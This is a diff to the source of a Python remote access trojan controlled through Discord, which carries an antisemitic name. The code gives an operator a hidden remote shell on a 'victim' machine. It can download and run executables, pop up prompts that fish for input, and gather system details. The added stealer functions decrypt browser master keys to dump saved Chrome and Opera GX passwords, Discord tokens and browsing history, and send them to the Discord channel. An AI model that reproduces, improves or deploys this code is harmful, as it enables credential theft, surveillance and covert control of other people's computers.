@@ -1,25 +1,30 @@
+from Cryptodome.Cipher import AES
 from discord.ext import commands
 from PIL import Image, ImageDraw
 from threading import Thread
 from pynput import keyboard
 import subprocess
 import webbrowser
-import mss.tools
+import win32crypt
 import pyautogui
 import PyElevate
 import pyperclip
 import datetime
 import platform
+import pymsgbox
 import requests
 import asyncio
 import discord
+import getpass
 import hashlib
 import pyaudio
+import sqlite3
 import tarfile
+import base64
 import ctypes
 import psutil
 import shutil
-import winreg
+import json
 import time
 import uuid
 import wave
@@ -32,6 +37,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
+version = "1.0.3"  # Replace with current jewfuss version (not required just something you can change if you want to keep track of version) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -41,18 +47,98 @@ bot = commands.Bot(command_prefix='$', intents=intents)
 bot.remove_command('help')
 pyautogui.FAILSAFE = False
 
-def sanitize_channel_name(name):
-    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '', name).lower()
-    return sanitized
+@bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)")
+async def update(ctx):
+    if not ctx.message.attachments:
+        await ctx.send("No file attached. Please attach a `.exe` file.", empherial=True)
+        return
 
-def bot_channel():
-    raw_channel_name = f"{os.environ.get('COMPUTERNAME', 'UnknownDevice')}-{os.getlogin()}"
-    channel_name = sanitize_channel_name(raw_channel_name)
-    return channel_name
+    attachment = ctx.message.attachments[0]
 
-def force_home_directory():
-    home_dir = os.path.expanduser("~")
-    return home_dir
+    if not attachment.filename.lower().endswith(".exe"):
+        await ctx.send("Attached file must be a `.exe`.", empherial=True)
+        return
+
+    try:
+        save_path = os.path.join(os.path.dirname(sys.argv[0]), attachment.filename)
+        await attachment.save(save_path)
+        await ctx.send(f"Updater `{attachment.filename}` has been downloaded.")
+        
+        subprocess.Popen([save_path, "--updater"], shell=True)
+        await ctx.send(f"Updater `{attachment.filename}` has been executed.")
+    except Exception as e:
+        await ctx.send(f"Could not process the update. {str(e)}", empherial=True)
+
+@bot.command(help="Shows a popup on victim's machine and replies with the entered text using pymsgbox. (Window does not auto focus)")
+async def prompt(ctx, *, question_and_default: str = ""):
+    await ctx.send("✅ Prompt sent to victim. Waiting for input...")
+    
+    def show_prompt():
+        parts = question_and_default.split("|", 1)
+        question = parts[0].strip() if len(parts) >= 1 else ""
+        default = parts[1].strip() if len(parts) == 2 else ""
+
+        try:
+            answer = pymsgbox.prompt(text=question, title="Input Required", default=default)
+            if answer is None:
+                response = "User canceled the prompt."
+            else:
+                response = f"User entered: `{answer}`"
+        except Exception as e:
+            response = f"Error showing prompt: {e}"
+
+        asyncio.run_coroutine_threadsafe(ctx.reply(response), bot.loop)
+
+    Thread(target=show_prompt, daemon=True).start()
+
+@bot.command(help="Checks if the victims device is up.")
+async def ping(ctx):
+    await ctx.send("Pong!")
+
+@bot.command(help="Shows victims device status including uptime, resource usage, etc.")
+async def status(ctx):
+    global version
+    
+    if True:
+        # ── Names
+        dev_name = platform.node()
+        user_name = getpass.getuser()
+
+        # ── Uptime (System & Bot)
+        boot_time = psutil.boot_time()
+        system_uptime = time.time() - boot_time
+        program_uptime = time.time() - psutil.Process(os.getpid()).create_time()
+
+        def format_duration(seconds):
+            m, s = divmod(int(seconds), 60)
+            h, m = divmod(m, 60)
+            d, h = divmod(h, 24)
+            return f"{d}d {h}h {m}m {s}s"
+
+        # ── CPU & RAM Usage
+        cpu_usage = psutil.cpu_percent(interval=1)
+        proc = psutil.Process(os.getpid())
+        rat_cpu = proc.cpu_percent(interval=1)
+        rat_mem = proc.memory_info().rss / (1024**2)
+        total_mem = psutil.virtual_memory().total / (1024**2)
+
+        # ── Script Location
+        script_path = os.path.abspath(sys.argv[0])
+
+        # ── Embed
+        embed = discord.Embed(
+            title=f"`{dev_name}/{user_name}` Status",
+            color=discord.Color.blue()
+        )
+        
+        embed.add_field(name="Script Location", value=f"`{script_path}`", inline=False)
+        embed.add_field(name="RAT Memory Usage", value=f"`{rat_mem:.2f}/{total_mem:.0f} MB`", inline=True)
+        embed.add_field(name="RAT CPU Usage", value=f"`{rat_cpu}%`", inline=True)
+        embed.add_field(name="System Uptime", value=f"`{format_duration(system_uptime)}`", inline=False)
+        embed.add_field(name="Bot Uptime", value=f"`{format_duration(program_uptime)}`", inline=False)
+        embed.add_field(name="System CPU Usage", value=f"`{cpu_usage}%`", inline=False)
+        embed.add_field(name="Version", value=f"`{version}`", inline=False)
+        await ctx.send(embed=embed)
 
 def check_permissions(file_path):
     permissions = {
@@ -62,13 +148,6 @@ def check_permissions(file_path):
         'delete': os.access(file_path, os.W_OK)
     }
     return permissions
-
-async def send_permission_status(ctx, file_path):
-    permissions = check_permissions(file_path)
-    if not all(permissions.values()):
-        await ctx.send(f"This program does not have access to modifying {file_path}. Permissions for the file are as set:")
-        perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
-        await ctx.send(f"```{perms_message}```")
 
 # -------------------
 #       PYMACRO
@@ -339,12 +418,51 @@ async def macro(ctx, *, command: str = None):
         
     await ctx.send("No .pymacro file attached!")
 
-@bot.command(help="Runs a command using subprocesses")
-async def cmd(ctx, *, command: str):
+@bot.command(help="Runs a command using subprocess and streams output live")
+async def cmd(ctx, *, command: str = None):
+    
+    if command is None or command.strip() == "":
+        await ctx.send("Command cannot be empty.")
+        return
+    
     try:
-        result = subprocess.run(f'cmd /c "{command}"', shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        output = result.stdout.strip() or result.stderr.strip() or "No output"
-        await ctx.send(f"## Output:\n{output}")
+        process = subprocess.Popen(
+            f'cmd /c "{command}"',
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            encoding="utf-8",
+            errors="replace"
+        )
+
+        buffer = []
+        first_output = None
+
+        while True:
+            output = process.stdout.readline()
+            if output == "" and process.poll() is not None:
+                break
+            output = output.strip()
+            if output:
+                buffer.append(output)
+                if first_output is None:
+                    first_output = output
+                else:
+                    if 'thread' not in locals():
+                        current_datetime = datetime.datetime.now().strftime("-%S")
+                        unique_thread_name = command[:100-len(current_datetime)]+current_datetime
+                        thread = await ctx.send(f"**Output:**\n{first_output}")
+                        thread = await thread.create_thread(name=unique_thread_name)
+                    await thread.send(output)
+
+        if first_output and 'thread' not in locals():
+            await ctx.send(f"**Output:**\n{first_output}")
+            
+        if 'thread' in locals() and len("\n".join(buffer)) > 2000:
+            buffer_io = io.BytesIO("\n".join(buffer).encode("utf-8"))
+            await thread.send(file=discord.File(fp=buffer_io, filename="command_output.txt"))
+
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
 
@@ -354,98 +472,118 @@ async def checkperms(ctx, file_path: str):
     perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
     await ctx.send(f"Permissions for {file_path} are as follows:\n```{perms_message}```")
 
-@bot.command(help="Delete and recreates bots channel, wiping all the messages")
+def compressed_device_id():
+    uuid_raw = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
+    return base64.b32encode(uuid.UUID(uuid_raw).bytes).decode().rstrip("=").lower()
+
+@bot.command(help="Delete and recreate bot's channel, wiping all messages")
 async def init(ctx):
-    user = ctx.author
+    if not ctx.author.guild_permissions.administrator:
+        await ctx.send("You don't have permission to initialize the configuration.")
+        return
 
-    if user.guild_permissions.administrator:
-        channel_name = bot_channel()
-        existing_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
+    category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
+    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()
 
-        if ctx.message.content.endswith("/f"):
-            if existing_channel is not None:
-                await existing_channel.delete()
-            overwrites = {
-                ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
-                ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
-            }
-            new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
-            await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
-        else:
-            if existing_channel is None:
-                overwrites = {
-                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
-                    ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
-                }
-                new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
-                await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
-            else:
-                await ctx.send("Channel already exists, please run `$init /f` to wipe the channel (delete and recreate).")
+    category = discord.utils.get(ctx.guild.categories, name=category_name)
+
+    if category is None:
+        category_overwrites = {
+            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
+            ctx.guild.me: discord.PermissionOverwrite(read_messages=True) 
+        }
+        category = await ctx.guild.create_category(category_name, overwrites=category_overwrites)
+
+    existing_channel = discord.utils.get(category.text_channels, name=channel_name)
+
+    if ctx.message.content.endswith("/f"):
+        if existing_channel:
+            await existing_channel.delete()
+        new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
+        await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
     else:
-        await ctx.send("You don't have permission to initialize configuration for this guild.")
+        if existing_channel:
+            await ctx.send("Channel already exists. Run `$init /f` to wipe the channel.")
+        else:
+            new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
+            await new_channel.send(f"Bot channel created by {ctx.author.mention}.")
 
 @bot.event
 async def on_guild_join(guild):
-    channel_name = bot_channel()
-    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
+    category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
+    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()
 
-    if existing_channel is None:
-        overwrites = {
+    category = discord.utils.get(guild.categories, name=category_name)
+    
+    if category is None:
+        category_overwrites = {
             guild.default_role: discord.PermissionOverwrite(read_messages=False),
             guild.me: discord.PermissionOverwrite(read_messages=True)
         }
-        new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
+        category = await guild.create_category(category_name, overwrites=category_overwrites)
+
+    existing_channel = discord.utils.get(category.text_channels, name=channel_name)
+
+    if existing_channel is None:
+        new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
         await new_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")
-    else:
-        await existing_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")
 
 @bot.event
 async def on_ready():
-    in_server_ammount = 0
+    in_server_amount = 0
+    logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S") + f" (UTC{'-' if (offset := (time.altzone if time.localtime().tm_isdst else time.timezone) // 3600) < 0 else '+'}{abs(offset)})"
+
     for guild in bot.guilds:
-        channel_name = bot_channel()
-        existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
-        logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S")
+        category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
+        channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()
+
+        category = discord.utils.get(guild.categories, name=category_name)
         
-        if existing_channel is None:
-            overwrites = {
+        if category is None:
+            category_overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
                 guild.me: discord.PermissionOverwrite(read_messages=True)
             }
-            new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
+            category = await guild.create_category(category_name, overwrites=category_overwrites)
+
+        existing_channel = discord.utils.get(category.text_channels, name=channel_name)
+        
+        if existing_channel is None:
+            new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
             await new_channel.edit(topic=logon_date)
             await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
         else:
             await existing_channel.edit(topic=logon_date)
             await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
-        in_server_ammount += 1
-            
-    print(f'JewFuss-XT logged in as "{bot.user.name}" on {in_server_ammount} server(s)')
-    
-    try:
-        await bot.tree.sync()
-        print("synced bot commands")
-    except Exception as e:
-        print(f"Error syncing bot commands: {e}")
+        in_server_amount += 1
 
+    print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
+    
 @bot.event
 async def on_message(message):
     if message.author.bot:
         return
-    channel_name = bot_channel()
-    if message.channel.name == channel_name:
-        await bot.process_commands(message)
-        
+
+    expected_category = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
+    expected_channel = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()
+    actual_category = message.channel.category.name if message.channel.category else None
+    
+    if actual_category != expected_category or message.channel.name != expected_channel:
+        return  
+
+    await bot.process_commands(message)
+    
 @bot.command(help="Gets information on the victim's system")
 async def sysinfo(ctx):
     try:
+        c = wmi.WMI()
         windows_devicename = platform.node()
+        windows_device_uuid = c.Win32_ComputerSystemProduct()[0].UUID
         windows_version = platform.version()
         windows_os_build = platform.win32_ver()[1]
         windows_os_type = platform.win32_ver()[0]
         timezone = time.tzname[0] if time.daylight != 0 else time.tzname[1]
         
-        c = wmi.WMI()
         system = c.Win32_ComputerSystem()[0]
         bios = c.Win32_BIOS()[0]
         processor = c.Win32_Processor()[0]
@@ -475,6 +613,7 @@ async def sysinfo(ctx):
     
     output = ""
     output += f"Windows Information:\n"
+    output += f"Windows device UUID: {windows_device_uuid}\n"
     output += f"Windows devicename: {windows_devicename}\n"
     output += f"Windows Version: {windows_version}\n"
     output += f"Windows OS Build: {windows_os_build}\n"
@@ -499,50 +638,352 @@ async def sysinfo(ctx):
     else:
         await ctx.send(output)
 
-@bot.command(help="Discord-Token-Grabber by TomekLisek on replit modified as a discord command")
-async def getdiscord(ctx):
-    try:
-        local = os.getenv('LOCALAPPDATA')
-        roaming = os.getenv('APPDATA')
-        paths = {
-            'Discord': roaming + '\\Discord',
-            'Discord Canary': roaming + '\\discordcanary',
-            'Discord PTB': roaming + '\\discordptb',
-            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-            'Opera': roaming + '\\Opera Software\\Opera Stable',
-            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-        }
-        message = '​\n'
-        for platform, path in paths.items():
-            try:
-                if not os.path.exists(path):
-                    continue
-                message += f'**{platform}**```'
-                path += '\\Local Storage\\leveldb'
-                tokens = []
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                            for token in re.findall(regex, line):
-                                tokens.append(token)
-                if len(tokens) > 0:
-                    for token in tokens:
-                        message += f'{token}'
-                else:
-                    message += 'No tokens found.'
-            except Exception as e:
-                message += f'**Somthing went wrong**```{e}```'
+# Stealers
+
+def get_master_key(local_state_path):
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+@bot.command(help="Gets discord tokens from Google Chrome, Opera (GX), Brave & Yandex")
+async def getdiscord(ctx, max_force_profiles: int = 10):
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    chrome_base = os.path.join(local, 'Google', 'Chrome', 'User Data')
+    paths = {
+        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
+        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
+        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+        'Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
+    }
+
+    def decrypt_token(encrypted_value, key):
         try:
-            await ctx.send(message)
+            if encrypted_value.startswith(b'dQw4w9WgXcQ:'):
+                encrypted_value = base64.b64decode(encrypted_value[15:])
+            iv = encrypted_value[3:15]
+            payload = encrypted_value[15:-16]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)
+            return decrypted.decode()
         except:
-            pass
+            return None
+
+    embed = discord.Embed(title="Discord Tokens (Browser-Only)", color=discord.Color.blue())
+    found_any = False
+
+    def scan_leveldb(profile_path, aes_key):
+        leveldb = os.path.join(profile_path, 'Local Storage', 'leveldb')
+        tokens = set()
+
+        if not os.path.exists(leveldb):
+            return tokens
+
+        for file_name in os.listdir(leveldb):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+            try:
+                with open(os.path.join(leveldb, file_name), errors='ignore') as f:
+                    lines = f.readlines()
+                for line in lines:
+                    line = line.strip()
+                    if aes_key and "dQw4w9WgXcQ:" in line:
+                        for match in re.findall(r'dQw4w9WgXcQ:[^\"]+', line):
+                            decrypted = decrypt_token(match.encode(), aes_key)
+                            if decrypted:
+                                tokens.add(decrypted)
+                    for match in re.findall(r'mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line):
+                        tokens.add(match)
+            except:
+                continue
+
+        return tokens
+
+    if os.path.exists(chrome_base):
+        chrome_local_state = os.path.join(chrome_base, 'Local State')
+        aes_key = get_master_key(chrome_local_state) if os.path.exists(chrome_local_state) else None
+        chrome_tokens = set()
+
+        # Always check Default
+        default_path = os.path.join(chrome_base, "Default")
+        if os.path.exists(default_path):
+            chrome_tokens.update(scan_leveldb(default_path, aes_key))
+
+        # Force check Profile 1 to max_force_profiles
+        for i in range(1, max_force_profiles + 1):
+            profile_path = os.path.join(chrome_base, f"Profile {i}")
+            if os.path.exists(profile_path):
+                chrome_tokens.update(scan_leveldb(profile_path, aes_key))
+
+        # Continue checking Profile N+ until folder missing
+        i = max_force_profiles + 1
+        while True:
+            profile_path = os.path.join(chrome_base, f"Profile {i}")
+            if not os.path.exists(profile_path):
+                break
+            chrome_tokens.update(scan_leveldb(profile_path, aes_key))
+            i += 1
+
+        if chrome_tokens:
+            found_any = True
+            formatted = "\n".join(f"`{t}`" for t in chrome_tokens)
+            embed.add_field(name="Google Chrome", value=formatted, inline=False)
+
+    for platform, base_path in paths.items():
+        try:
+            local_state = os.path.join(os.path.dirname(base_path), 'Local State')
+            aes_key = get_master_key(local_state) if os.path.exists(local_state) else None
+            tokens = scan_leveldb(base_path, aes_key)
+            if tokens:
+                found_any = True
+                formatted = "\n".join(f"`{t}`" for t in tokens)
+                embed.add_field(name=platform, value=formatted, inline=False)
+        except Exception as e:
+            embed.add_field(name=platform, value=f"Error: `{str(e)}`", inline=False)
+
+    if not found_any:
+        embed.description = "No usable tokens found in browser paths."
+
+    try:
+        await ctx.send(embed=embed)
     except Exception as e:
-        await ctx.send(f"Error executing getdiscord: {str(e)}")
-    
+        await ctx.send(f"Error sending message: {str(e)}")
+
+def decrypt_password(ciphertext, key):
+    try:
+        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
+            iv = ciphertext[3:15]
+            payload = ciphertext[15:-16]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(payload).decode()
+        else:
+            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
+    except:
+        return "Failed to decrypt"
+
+def dump_passwords(login_data_path, key):
+    if not os.path.exists(login_data_path):
+        return []
+    temp_db = os.path.join(os.getenv("TEMP"), "temp_browser_login_data.db")
+    shutil.copyfile(login_data_path, temp_db)
+    conn = sqlite3.connect(temp_db)
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    entries = cursor.fetchall()
+    conn.close()
+    return entries
+
+@bot.command(help="Gets passwords from Google Chrome & Opera GX")
+async def getpasswords(ctx, max_force_profiles: int = 10):
+    files = []
+    missing_browsers = []
+
+    # Chrome
+    chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+    chrome_local_state = os.path.join(chrome_base, "Local State")
+
+    if os.path.exists(chrome_local_state):
+        try:
+            chrome_key = get_master_key(chrome_local_state)
+            chrome_output = io.StringIO()
+
+            default_login = os.path.join(chrome_base, "Default", "Login Data")
+            if os.path.exists(default_login):
+                entries = dump_passwords(default_login, chrome_key)
+                if entries:
+                    chrome_output.write("===== Default =====\n\n")
+                    for url, username, pw in entries:
+                        chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")
+
+            for i in range(1, max_force_profiles + 1):
+                profile = f"Profile {i}"
+                login_data = os.path.join(chrome_base, profile, "Login Data")
+                if os.path.exists(login_data):
+                    entries = dump_passwords(login_data, chrome_key)
+                    if entries:
+                        chrome_output.write(f"\n===== {profile} =====\n\n")
+                        for url, username, pw in entries:
+                            chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")
+
+            i = max_force_profiles + 1
+            while True:
+                profile = f"Profile {i}"
+                login_data = os.path.join(chrome_base, profile, "Login Data")
+                if not os.path.exists(login_data):
+                    break
+                entries = dump_passwords(login_data, chrome_key)
+                if entries:
+                    chrome_output.write(f"\n===== {profile} =====\n\n")
+                    for url, username, pw in entries:
+                        chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")
+                i += 1
+
+            if chrome_output.getvalue():
+                chrome_buffer = io.BytesIO(chrome_output.getvalue().encode('utf-8'))
+                files.append(discord.File(fp=chrome_buffer, filename="Chrome_passwords.txt"))
+            else:
+                missing_browsers.append("Chrome")
+
+        except Exception:
+            missing_browsers.append("Chrome")
+    else:
+        missing_browsers.append("Chrome")
+
+    # Opera GX
+    opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
+    opera_local_state = os.path.join(opera_path, "Local State")
+    opera_login_data = os.path.join(opera_path, "Login Data")
+
+    if os.path.exists(opera_local_state) and os.path.exists(opera_login_data):
+        try:
+            opera_key = get_master_key(opera_local_state)
+            entries = dump_passwords(opera_login_data, opera_key)
+
+            if entries:
+                opera_output = io.StringIO()
+                opera_output.write("===== Opera GX =====\n\n")
+                for url, username, pw in entries:
+                    opera_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, opera_key)}\n{'-'*40}\n")
+                opera_buffer = io.BytesIO(opera_output.getvalue().encode('utf-8'))
+                files.append(discord.File(fp=opera_buffer, filename="OperaGX_passwords.txt"))
+            else:
+                missing_browsers.append("Opera GX")
+
+        except Exception:
+            missing_browsers.append("Opera GX")
+    else:
+        missing_browsers.append("Opera GX")
+
+    content = ""
+    if missing_browsers and len(missing_browsers) < 2:
+        content = f"Files not found for: {missing_browsers[0]}"
+    elif missing_browsers:
+        content = "Files not found for: " + ", ".join(missing_browsers)
+
+    if not files and not content:
+        content = "No password files were found for either browser."
+
+    try:
+        await ctx.send(content=content, files=files if files else None)
+    except Exception as e:
+        await ctx.send(f"Error sending message: {e}")
+        
+@bot.command(help="Gets browser history from Google Chrome & Opera GX")
+async def gethistory(ctx, max_force_profiles: int = 10):
+    files = []
+    missing_browsers = []
+
+    def extract_chrome_history():
+        base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+        if not os.path.exists(base):
+            return None, "Chrome"
+
+        output = io.StringIO()
+        epoch_start = datetime.datetime(1601, 1, 1)
+        min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
+        min_timestamp = int((min_date - epoch_start).total_seconds() * 1_000_000)
+
+        def extract(profile):
+            try:
+                profile_path = os.path.join(base, profile, "History")
+                if not os.path.exists(profile_path):
+                    return False
+                temp_db = os.path.join(os.getenv("TEMP"), f"{profile}_history_temp.db")
+                shutil.copy2(profile_path, temp_db)
+            
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
+                rows = cursor.fetchall()
+                if rows:
+                    output.write(f"===== {profile} =====\n\n")
+                    for url, ts in rows:
+                        visit_time = epoch_start + datetime.timedelta(microseconds=ts)
+                        output.write(f"URL: {url}\n")
+                        output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
+                        output.write("----------------------------------------\n")
+                    output.write("\n")
+                conn.close()
+            except Exception as e:
+                ctx.send("Error extracting Chrome history: " + str(e))
+            os.remove(temp_db)
+            return True
+
+        found = extract("Default")
+
+        for i in range(1, max_force_profiles + 1):
+            found |= extract(f"Profile {i}")
+
+        i = max_force_profiles + 1
+        while True:
+            if not extract(f"Profile {i}"):
+                break
+            i += 1
+        return output.getvalue().encode("utf-8") if found else None, None
+
+    def extract_opera_history():
+        try:
+            base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
+            history_path = os.path.join(base, "History")
+            if not os.path.exists(history_path):
+                return None, "Opera GX"
+
+            output = io.StringIO()
+            epoch_start = datetime.datetime(1601, 1, 1)
+            min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
+            min_timestamp = int((min_date - epoch_start).total_seconds() * 1_000_000)
+
+            temp_db = os.path.join(os.getenv("TEMP"), "opera_history_temp.db")
+            shutil.copy2(history_path, temp_db)
+
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
+            rows = cursor.fetchall()
+            if rows:
+                output.write("===== Opera GX =====\n\n")
+                for url, ts in rows:
+                    visit_time = epoch_start + datetime.timedelta(microseconds=ts)
+                    output.write(f"URL: {url}\n")
+                    output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
+                    output.write("----------------------------------------\n")
+                output.write("\n")
+            conn.close()
+        except Exception as e:
+            ctx.send("Error extracting Opera GX history: " + str(e))
+        os.remove(temp_db)
+        return output.getvalue().encode("utf-8"), None
+
+    chrome_data, chrome_err = extract_chrome_history()
+    opera_data, opera_err = extract_opera_history()
+
+    if chrome_data:
+        chrome_buffer = io.BytesIO(chrome_data)
+        files.append(discord.File(fp=chrome_buffer, filename="Chrome_history.txt"))
+    elif chrome_err:
+        missing_browsers.append(chrome_err)
+
+    if opera_data:
+        opera_buffer = io.BytesIO(opera_data)
+        files.append(discord.File(fp=opera_buffer, filename="OperaGX_history.txt"))
+    elif opera_err:
+        missing_browsers.append(opera_err)
+
+    content = ""
+    if missing_browsers and len(missing_browsers) < 2:
+        content = f"Files not found for: {missing_browsers[0]}"
+    elif missing_browsers:
+        content = "Files not found for: " + ", ".join(missing_browsers)
+
+    if not files and not content:
+        content = "No history files were found for either browser."
+
+    try:
+        await ctx.send(content=content, files=files if files else None)
+    except Exception as e:
+        await ctx.send(f"Error sending message: {e}")
+
 @bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display, If you dont like it, you can suck it.")
 async def setpos(ctx, x: int, y: int):
     try:
@@ -757,12 +1198,13 @@ async def upload(ctx, folder: str = None):
     else:
         await ctx.send("Error: No file attached to the message.")
 
-@bot.command(help="Lists contents of a folder on the system, format $ls {folder (D:/folder/)}")
+@bot.command(help="Lists contents of a folder on the system, format $ls {folder (D:/folder)}")
 async def ls(ctx, path: str = None):
-    try: 
+    try:
         if not path:
             await ctx.send("Error: No path provided. Please specify a directory path to list.")
             return
+
         if not os.path.exists(path):
             await ctx.send(f"Error: The path '{path}' does not exist.")
             return
@@ -775,7 +1217,7 @@ async def ls(ctx, path: str = None):
         dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
         files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
         response = f"Parent Directory: {parent_dir}\n\n"
-        
+
         if dirs or files:
             for directory in dirs:
                 dir_full_path = os.path.join(path, directory)
@@ -785,7 +1227,7 @@ async def ls(ctx, path: str = None):
                 response += f"[FILE] {file_full_path}\n"
         else:
             response += "This directory is empty.\n"
-        
+
         buffer = io.BytesIO(response.encode('utf-8'))
         await ctx.send(file=discord.File(fp=buffer, filename="directory_listing.txt"))
     except Exception as e:
@@ -950,7 +1392,6 @@ async def tasks(ctx):
     except Exception as e:
         await ctx.send(f"Error: Could not list tasks. {str(e)}")
 
-
 @bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
 async def kill(ctx, arg: str = ""):
     if arg == "" or not arg:
@@ -1093,48 +1534,52 @@ async def commands(ctx, page: int = 1):
         except asyncio.TimeoutError:
             break
 
-@bot.command(help="Hides the script file and disables show hidden files (windows doesn't allow autostarting hidden files so be carefull).")
-async def hidescript(ctx):
-    try:
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
-        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
-        winreg.CloseKey(reg_key)
-        script_path = sys.executable
